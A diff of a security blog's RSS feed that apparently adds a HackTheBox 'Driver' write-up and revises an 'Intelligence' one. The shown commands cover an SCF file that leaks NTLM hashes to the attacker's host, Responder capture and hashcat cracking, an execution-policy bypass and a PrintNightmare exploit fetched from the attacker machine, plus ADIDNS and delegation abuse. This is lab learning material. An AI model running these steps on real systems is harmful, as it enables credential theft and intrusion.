@@ -7,13 +7,225 @@
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/hackthebox/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>HackTheBox - Driver</title>
+      <link>https://fahmifj.github.io/hackthebox/driver/</link>
+      <pubDate>Sun, 25 Sep 2022 17:28:30 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/driver/</guid>
+      <description>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</description>
+      <content:encoded><![CDATA[<p>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Stealing NTLM hash</li>
+<li>Printer spooler exploitation with PrintNightmare</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Responder</li>
+<li>PrintNightmare exploit PoC</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Performing full TCP scan with <code>nmap</code> reveals 4 open ports: Web/HTTP on <code>80</code> , MS-RPC on <code>135</code> , SMB on <code>445</code>, and WinRM on <code>5985</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
+</span></span><span class="line"><span class="cl">$ fscan 10.10.11.106 driver
+</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.106 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+</span></span><span class="line"><span class="cl">nmap -p 80,135,445,5985 -sC -sV -oA nmap/all-tcp-ports-driver 10.10.11.106
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 16:25 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.106
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.049s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http         Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-auth: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for</span> admin
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">Service Info: Host: DRIVER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-19T03:25:40
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2021-10-18T23:16:49
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 47.37 seconds
+</span></span></code></pre></div><p>Based on the results, it seems the website on port 80 requires an authentication first.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>On SMB, anonymous login is not allowed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
+</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.106 
+</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
+</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Poking the website with curl returns a <code>401 Unauthorized</code> response.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
+</span></span><span class="line"><span class="cl">$ curl -sv 10.10.11.106
+</span></span><span class="line"><span class="cl">*   Trying 10.10.11.106:80...
+</span></span><span class="line"><span class="cl">* Connected to 10.10.11.106 <span class="o">(</span>10.10.11.106<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c1">#0)</span>
+</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
+</span></span><span class="line"><span class="cl">&gt; Host: 10.10.11.106
+</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.74.0
+</span></span><span class="line"><span class="cl">&gt; Accept: */*
+</span></span><span class="line"><span class="cl">&gt; 
+</span></span><span class="line"><span class="cl">* Mark bundle as not supporting multiuse
+</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">401</span> Unauthorized
+</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">&lt; Server: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">&lt; X-Powered-By: PHP/7.3.25
+</span></span><span class="line"><span class="cl">&lt; WWW-Authenticate: Basic <span class="nv">realm</span><span class="o">=</span><span class="s2">&#34;MFP Firmware Update Center. Please enter password for admin&#34;</span>
+</span></span><span class="line"><span class="cl">&lt; Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:03:53 GMT
+</span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">20</span>
+</span></span><span class="line"><span class="cl">&lt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 10.10.11.106 left intact</span>
+</span></span><span class="line"><span class="cl">Invalid Credentials%
+</span></span></code></pre></div><p>Surprisingly, <code>admin:admin</code> is a valid credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
+</span></span><span class="line"><span class="cl">$ curl -u <span class="s1">&#39;admin:admin&#39;</span> -I 10.10.11.106 
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.3.25
+</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:07:15 GMT
+</span></span></code></pre></div><p>At the home page, it tells the purpose of this website. At the bottom, there&rsquo;s a potential username.</p>
+<p><div class="img-container"><img src="imgs/image-20211019040903346.png" alt="image-20211019040903346"  /></div>
+</p>
+<p>On the Firmware Updates menu, there&rsquo;s an upload function.</p>
+<p><div class="img-container"><img src="imgs/image-20211019041022554.png" alt="image-20211019041022554"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-tony">Shell as tony</h3>
+<h4 id="stealing-ntlm-response">Stealing NTLM Response</h4>
+<p>The firmware updates page actually gives a hint, where it states that the uploaded file will be put into a file share. The file will also be reviewed by a testing team.</p>
+<p><div class="img-container"><img src="imgs/image-20211020034608009.png" alt="image-20211020034608009"  /></div>
+</p>
+<p>The idea here is to steal the NTLM hash of the testing team.</p>
+<p>My first attempt was putting an exe file by assuming the team would do some interaction like clicking on the file after it gets uploaded on the share. But nothing come back to my listener</p>
+<p>And then I found <a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">this blog</a> and learned that an SCF (shell command file) can be used to trigger NTLM authentication without interaction with the file itself.</p>
+<p>From here, I&rsquo;ll create an SCF file and upload it to the web. I&rsquo;ll start responder as well. Once the testing team visit the share folder, the explorer will try to resolve the network path looking for the icon.</p>
+<p><code>iamf.scf</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[Shell]
+</span></span><span class="line"><span class="cl">Command=2
+</span></span><span class="line"><span class="cl">IconFile=\\10.10.14.11\iamf.ico
+</span></span><span class="line"><span class="cl">[Taskbar]
+</span></span><span class="line"><span class="cl">Command=ToggleDesktop
+</span></span></code></pre></div><p>On my responder, it captures hash of user <code>tony</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.11» 
+</span></span><span class="line"><span class="cl">$ sudo responder -w -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.10.11.106
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : DRIVER<span class="se">\t</span>ony
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:010100000000000080E4F7F905C5D701E1F7DFE8E2F4DE370000000002000800390043004500550001001E00570049004E002D004A00340043004E005A004D00300050004A004F00500004003400570049004E002D004A00340043004E005A004D00300050004A004F0050002E0039004300450055002E004C004F00430041004C000300140039004300450055002E004C004F00430041004C000500140039004300450055002E004C004F00430041004C000700080080E4F7F905C5D701060004000200000008003000300000000000000000000000002000008363172F7CE9FE7884871E6477C46D539D00C6773AF2BB03792621108883B6390A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000 
+</span></span></code></pre></div><h4 id="hash-crack">Hash crack</h4>
+<p>The password can easily be cracked with <code>hashcat</code> and <code>rockyou.txt</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ hashcat -m <span class="m">5600</span> <span class="s1">&#39;tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...[SNIP]...&#39;</span> /c/tools/rockyou.txt --show
+</span></span><span class="line"><span class="cl">tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...<span class="o">[</span>SNIP<span class="o">]</span>...:liltony
+</span></span></code></pre></div><h4 id="winrm">WinRM</h4>
+<p>The credentials can be used for remote access via WinRM</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
+</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;tony&#39;</span> -p liltony
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; 
+</span></span></code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">-ar---       10/19/2021   5:40 PM             <span class="m">34</span> user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; gc user.txt
+</span></span><span class="line"><span class="cl">f04c7b...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as--administrator">Shell as  Administrator</h3>
+<h4 id="printnightmare">PrintNightmare</h4>
+<p>I quickly check if the spooler service is running because the box is named &ldquo;Driver&rdquo; and the website is all about printers. And It&rsquo;s!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Get-Service -name spooler
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Status   Name               DisplayName
+</span></span><span class="line"><span class="cl">------   ----               -----------
+</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
+</span></span></code></pre></div><p>At that time, the PrintNightmare vulnerability (CVE-2021-1675) is still a fresh thing, so it&rsquo;s worth to try.</p>
+<p>First, I&rsquo;ll grab the <a href="https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1">PowerShell exploit module</a> from my machine</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\users\tony\downloads&gt; wget 10.10.14.11:8000/CVE-2021-1675.ps1 -UseBasicParsing -outfile CVE-2021-1675.ps1
+</code></pre><p>But during import, it fails.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">File C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads<span class="se">\C</span>VE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
+</span></span><span class="line"><span class="cl">At line:1 char:1
+</span></span><span class="line"><span class="cl">+ Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
+</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span class="line"><span class="cl">    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module<span class="o">]</span>, PSSecurityException
+</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
+</span></span></code></pre></div><p>That&rsquo;s because the shell are get restricted. Fortunately, it is possible to bypass this restriction with the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force<span class="p">;</span>
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Get-ExecutionPolicy
+</span></span><span class="line"><span class="cl">Unrestricted
+</span></span></code></pre></div><p>Now I can load the module and run the <code>Invoke-Nightmare</code> command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Invoke-Nightmare
+</span></span></code></pre></div><p>The command creates a default local admin user <code>adm1n</code> and password of <code>P@ssw0rd</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
+</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> root.txt
+</span></span><span class="line"><span class="cl">c1de502...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
+    <item>
       <title>HackTheBox - Intelligence</title>
       <link>https://fahmifj.github.io/hackthebox/intelligence/</link>
       <pubDate>Mon, 19 Sep 2022 01:01:51 +0700</pubDate>
       
       <guid>https://fahmifj.github.io/hackthebox/intelligence/</guid>
-      <description>Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&amp;rsquo; metadata returns a valid combination. There&amp;rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.</description>
-      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Intelligence/">Intelligence</a> brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&rsquo; metadata returns a valid combination. There&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash and it can be cracked. With Bloodhound, it reveals the user can retrieve GMSA password of a service account where it has delegation privilege on the AD domain. These two can be abused to own this box.</p>
+      <description>Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&amp;rsquo; metadata returns a valid combination. In the file shares, there&amp;rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.</description>
+      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Intelligence/">Intelligence</a> brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&rsquo; metadata returns a valid combination. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash where it can be cracked offline. Bloodhound reveals the user has permission to read GMSA account&rsquo;s password where the account has delegation permission to a service. These permissions can be abused for privilege escalation to domain admin.</p>
 <h4 id="skills-learned">Skills Learned</h4>
 <ul>
 <li>User enumeration via file metadata</li>
@@ -209,20 +421,7 @@
 </span></span></code></pre></div><p>It turns out I can read the flag from the <code>Users</code> share.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
 </span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/Users -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
-</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
-</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls 
-</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 21:20:26 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 21:20:26 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">  Administrator                       D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:18:39 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">  All Users                       DHSrn        <span class="m">0</span>  Sat Sep <span class="m">15</span> 03:21:46 <span class="m">2018</span>
-</span></span><span class="line"><span class="cl">  Default                           DHR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 22:17:40 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">  Default User                    DHSrn        <span class="m">0</span>  Sat Sep <span class="m">15</span> 03:21:46 <span class="m">2018</span>
-</span></span><span class="line"><span class="cl">  desktop.ini                       AHS      <span class="m">174</span>  Sat Sep <span class="m">15</span> 03:11:27 <span class="m">2018</span>
-</span></span><span class="line"><span class="cl">  Public                             DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:18:39 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">  Ted.Graves                          D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 21:20:26 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">  Tiffany.Molina                      D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444286</span> blocks available
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
 </span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls Tiffany.Molina<span class="se">\D</span>esktop
 </span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
 </span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
@@ -281,7 +480,8 @@
 </span></span></code></pre></div><p>So the script basically looks for any DNS record that starts with <code>web*</code>. For each record it finds, the script will check if the record is alive by issuing an HTTP request and if the response is not 200, the script will notify Ted Graves via email.</p>
 <p>The key take away here is the wildcard (<code>*</code>).</p>
 <h4 id="stealing-ntlmv2-response-via-adidns">Stealing NTLMv2 Response via ADIDNS</h4>
-<p>According to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/">this blog</a>, in AD, by default, any authenticated users can create a new DNS record (ADIDNS). The idea here is we try to create a subdomain record under <code>intelligence.htb</code> that starts with <code>web*</code>. So when the script (<code>downdetector.ps1</code>) runs, it might hit the record we created and perform NTLM authentication since the <code>Invoke-WebRequest</code> issued with the <code>-UseDefaultCredentials</code> flag.</p>
+<p>According to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/">this blog</a>, in AD, by default, any authenticated users can create a new DNS record (ADIDNS).</p>
+<p>The idea here is I can try to create a DNS under <code>intelligence.htb</code>  (subdomain) that starts with <code>web*</code>. So when the script runs, it might hit the record I created and then perform NTLM authentication since the <code>Invoke-WebRequest</code> issued with the <code>-UseDefaultCredentials</code> flag.</p>
 <p>Fortunately, a well-known security researcher, <a href="https://dirkjanm.io/">Dirk-jan</a> has already created a tool called <code>dnstool.py</code> to interact with ADIDNS. The tool was bundled with Krbrelayx repository, hence I&rsquo;ll clone it to my machine.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «/opt» «10.10.14.75» 
 </span></span><span class="line"><span class="cl">$ git clone https://github.com/dirkjanm/krbrelayx.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> krbrelayx
@@ -371,7 +571,7 @@
 </span></span><span class="line"><span class="cl"> &gt; itsupport
 </span></span><span class="line"><span class="cl">svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
 </span></span></code></pre></div><p>Since the password is managed by the DC, I don&rsquo;t have to try to crack it.</p>
-<h4 id="abusing-constrained-delegation-silver-ticket">Abusing Constrained Delegation: Silver Ticket</h4>
+<h4 id="abusing-constrained-delegation---silver-ticket">Abusing Constrained Delegation -&gt; Silver Ticket</h4>
 <p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">This site</a> explains what a constrained delegation is:</p>
 <blockquote>
 <p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it&rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p>
@@ -382,7 +582,7 @@
 </span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
 </span></span><span class="line"><span class="cl">msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
 </span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><p>For this, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p>
